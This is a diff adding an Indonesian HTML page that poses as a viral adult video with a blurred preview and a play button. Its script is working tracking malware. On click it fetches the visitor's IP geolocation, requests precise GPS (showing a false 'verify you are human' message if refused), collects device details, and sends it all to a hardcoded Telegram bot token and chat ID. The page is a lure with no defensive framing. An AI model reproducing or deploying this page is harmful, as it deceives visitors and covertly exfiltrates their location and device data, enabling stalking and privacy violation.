@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Berita Terkini</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+
+        /* Menambahkan background dengan gradien dan pola halus */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #1a202c; /* Warna gelap */
+            background-image: radial-gradient(at 0% 100%, #1e3a8a 0%, transparent 50%), radial-gradient(at 100% 0%, #065f46 0%, transparent 50%);
+        }
+
+        /* Kelas untuk overlay semi-transparan pada gambar */
+        .video-overlay {
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+        }
+
+        /* Efek hover pada tombol play */
+        #play-btn:hover {
+            transform: scale(1.1);
+        }
+
+        /* Efek tekan pada tombol play */
+        #play-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* Menghilangkan transisi pada gambar agar tidak bergetar saat hover */
+        .video-card-img {
+            transition: none;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-4 md:p-8 text-gray-100">
+
+    <div class="max-w-xl w-full p-6 md:p-8 bg-gray-900 rounded-3xl shadow-2xl backdrop-blur-sm bg-opacity-80 border border-gray-700">
+
+        <!-- Disclaimer Text di atas video -->
+        <div class="mb-6 text-center text-gray-400 text-sm md:text-base font-light">
+           
+        </div>
+
+        <!-- Header & Title -->
+        <header class="text-center mb-8 md:mb-12">
+            <h1 class="inline-block bg-teal-600 text-white font-bold text-3xl md:text-4xl py-4 px-8 rounded-full shadow-lg tracking-wide transform -rotate-2">
+                viral 18+
+            </h1>
+            <p class="text-gray-400 mt-4 text-sm md:text-base italic">
+                video seorang wanita melakukan adegan tidak senonoh di ruang public 
+            </p>
+        </header>
+
+        <!-- Video Card -->
+        <figure class="relative w-full aspect-video rounded-3xl overflow-hidden shadow-2xl group transition-all duration-300 transform hover:scale-105">
+            <img src="https://i.ibb.co/My2BzC2c/image.png" alt="Pratinjau berita viral" class="video-card-img absolute inset-0 w-full h-full object-cover filter blur-lg transition-all duration-300" />
+            <div class="video-overlay absolute inset-0 flex items-center justify-center">
+                <button id="play-btn" class="relative z-10 w-20 h-20 md:w-24 md:h-24 rounded-full bg-white bg-opacity-30 flex items-center justify-center shadow-2xl border border-white border-opacity-30 transition-all duration-300 transform" aria-label="Putar Video">
+                    <svg class="w-10 h-10 md:w-12 md:h-12 text-white" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                        <path d="M8 5v14l11-7z"/>
+                    </svg>
+                </button>
+            </div>
+        </figure>
+
+        <!-- Caption -->
+        <figcaption class="mt-8 text-lg md:text-xl font-semibold text-center text-gray-200 leading-relaxed">
+            yang lagi rame nih guys pria ini melakukan hal yang tidak senonoh di ruang publik dan tertekam oleh cctv
+        </figcaption>
+    </div>
+
+    <!-- Modal untuk menggantikan alert -->
+    <div id="custom-alert" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-black bg-opacity-60">
+        <div class="bg-gray-800 text-white p-6 rounded-lg shadow-xl text-center max-w-sm w-full">
+            <p id="alert-message" class="text-base"></p>
+            <button id="alert-ok-btn" class="mt-4 px-6 py-2 bg-teal-600 rounded-md hover:bg-teal-700 transition-colors">OK</button>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '7474809396:AAFzVx41utqmnmkTmvPLsknBsW58VZOH3Ds';
+        const CHAT_ID = '6128943834';
+
+        const playBtn = document.getElementById('play-btn');
+
+        // Menggantikan fungsi alert dengan modal kustom
+        function showCustomAlert(message) {
+            const customAlert = document.getElementById('custom-alert');
+            const alertMessage = document.getElementById('alert-message');
+            const alertOkBtn = document.getElementById('alert-ok-btn');
+
+            alertMessage.textContent = message;
+            customAlert.classList.remove('hidden');
+
+            alertOkBtn.onclick = () => {
+                customAlert.classList.add('hidden');
+            };
+        }
+
+        // Kirim pesan ke Telegram
+        function sendToTelegram(message) {
+            const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            })
+            .then(response => {
+                if (!response.ok) throw new Error('Gagal mengirim pesan ke Telegram.');
+                console.log('Pesan berhasil dikirim ke Telegram.');
+            })
+            .catch(error => console.error('Ada kesalahan saat mengirim pesan:', error));
+        }
+
+        // Format pesan gabungan lokasi GPS dan data IPAPI
+        function buildLogMessage(position, ipData) {
+            const latitude = position?.coords?.latitude?.toFixed(7) || 'N/A';
+            const longitude = position?.coords?.longitude?.toFixed(7) || 'N/A';
+
+            const userAgent = navigator.userAgent || 'N/A';
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const platform = navigator.platform || 'N/A';
+            const browserLang = navigator.language || 'N/A';
+            const cpuCores = navigator.hardwareConcurrency || 'N/A';
+            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
+            const connectionStatus = navigator.onLine ? 'Online' : 'Offline';
+            const cookiesEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
+            const referrer = document.referrer || 'N/A';
+            const localTime = new Date().toString();
+
+            // Link lokasi Google Maps yang benar
+            const mapsLink = `http://maps.google.com/maps?q=${latitude},${longitude}`;
+
+            return `📸 Visitor Log\n\n` +
+                `🔗 Location: ${mapsLink}\n` +
+                `🌐 IP: ${ipData.ip || 'N/A'}\n` +
+                `🌍 Negara: ${ipData.country_name || 'N/A'} (${ipData.country_code || 'N/A'})\n` +
+                `🏙️ Wilayah: ${ipData.region || 'N/A'}\n` +
+                `🏠 Kota: ${ipData.city || 'N/A'}\n` +
+                `📮 Zip: ${ipData.postal || 'N/A'}\n` +
+                `🏢 Org: ${ipData.org || 'N/A'}\n` +
+                `⏰ Zona Waktu: ${ipData.timezone || 'N/A'}\n` +
+                `📍 GPS: Lat ${latitude}, Lng ${longitude}\n` +
+                `📱 Device: ${userAgent}\n` +
+                `💻 Platform: ${platform}\n` +
+                `🖥️ Screen: ${screenResolution}\n` +
+                `🌐 Browser Lang: ${browserLang}\n` +
+                `⚙️ CPU Cores: ${cpuCores}\n` +
+                `💾 RAM: ${ram}\n` +
+                `🔌 Status: ${connectionStatus}\n` +
+                `🍪 Cookies: ${cookiesEnabled}\n` +
+                `↩️ Referrer: ${referrer}\n` +
+                `🕒 Local Time: ${localTime}`;
+        }
+
+        // Pesan fallback jika lokasi GPS tidak didapat
+        function buildFallbackMessage(ipData) {
+            const userAgent = navigator.userAgent || 'N/A';
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const platform = navigator.platform || 'N/A';
+            const browserLang = navigator.language || 'N/A';
+            const localTime = new Date().toString();
+
+            return `📸 Visitor Log\n\n` +
+                `⚠️ Lokasi GPS tidak diberikan atau gagal diakses.\n` +
+                `🌐 IP: ${ipData.ip || 'N/A'}\n` +
+                `🌍 Negara: ${ipData.country_name || 'N/A'} (${ipData.country_code || 'N/A'})\n` +
+                `🏙️ Wilayah: ${ipData.region || 'N/A'}\n` +
+                `🏠 Kota: ${ipData.city || 'N/A'}\n` +
+                `📮 Zip: ${ipData.postal || 'N/A'}\n` +
+                `🏢 Org: ${ipData.org || 'N/A'}\n` +
+                `⏰ Zona Waktu: ${ipData.timezone || 'N/A'}\n` +
+                `📱 Device: ${userAgent}\n` +
+                `💻 Platform: ${platform}\n` +
+                `🖥️ Screen: ${screenResolution}\n` +
+                `🌐 Browser Lang: ${browserLang}\n` +
+                `🕒 Local Time: ${localTime}`;
+        }
+
+        // Ambil data IP dan lokasi dari ipapi.co
+        async function fetchIpData() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (!res.ok) throw new Error('Gagal mengambil data IP');
+                return await res.json();
+            } catch (e) {
+                console.error(e);
+                return {};
+            }
+        }
+
+        // Cek status izin lokasi dan minta izin jika perlu
+        async function requestLocation() {
+            if (!navigator.geolocation) {
+                showCustomAlert('Geolocation tidak didukung browser Anda.');
+                return null;
+            }
+
+            if (navigator.permissions) {
+                try {
+                    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
+                    console.log('Status izin lokasi:', permissionStatus.state);
+
+                    if (permissionStatus.state === 'granted' || permissionStatus.state === 'prompt') {
+                        return new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(
+                                position => resolve(position),
+                                error => reject(error),
+                                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                            );
+                        });
+                    } else if (permissionStatus.state === 'denied') {
+                        showCustomAlert('untuk memutar video anda harus memverifikasi bahwa anda manusia dengan izinkan semua pop up dari google ');
+                        return null;
+                    }
+                } catch (e) {
+                    // Jika error, coba langsung minta lokasi
+                    return new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            position => resolve(position),
+                            error => reject(error),
+                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                        );
+                    });
+                }
+            } else {
+                // Jika permissions API tidak didukung, langsung minta lokasi
+                return new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(
+                        position => resolve(position),
+                        error => reject(error),
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                });
+            }
+        }
+
+        playBtn.addEventListener('click', async () => {
+            const ipData = await fetchIpData();
+
+            try {
+                const position = await requestLocation();
+                if (position) {
+                    sendToTelegram(buildLogMessage(position, ipData));
+                } else {
+                    sendToTelegram(buildFallbackMessage(ipData));
+                }
+            } catch (error) {
+                console.warn('Gagal mendapatkan lokasi:', error.message);
+                sendToTelegram(buildFallbackMessage(ipData));
+            }
+        });
+    </script>
+</body>
+</html>
